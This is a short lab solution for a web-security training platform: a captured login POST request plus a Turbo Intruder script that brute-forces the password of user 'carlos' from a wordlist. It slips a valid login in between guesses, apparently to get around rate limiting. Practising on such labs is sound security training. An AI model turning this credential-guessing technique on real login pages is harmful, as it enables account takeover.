POST /login HTTP/1.1
Host: ac781f5e1e83e09880014a9500cc003b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac781f5e1e83e09880014a9500cc003b.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close
Cookie: session=OBREp0XOUU1l6HjSDoFUjuH5d3nDglf7
Upgrade-Insecure-Requests: 1

username=%s&password=%s

# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    for word in open('/home/kiddie/Documents/BurpSuiteAcademy/AccessControl/password_sorted.txt'):
        engine.queue(target.req, ['wiener','peter'])
        engine.queue(target.req, ['carlos', word.rstrip()])


def handleResponse(req, interesting):
    table.add(req)
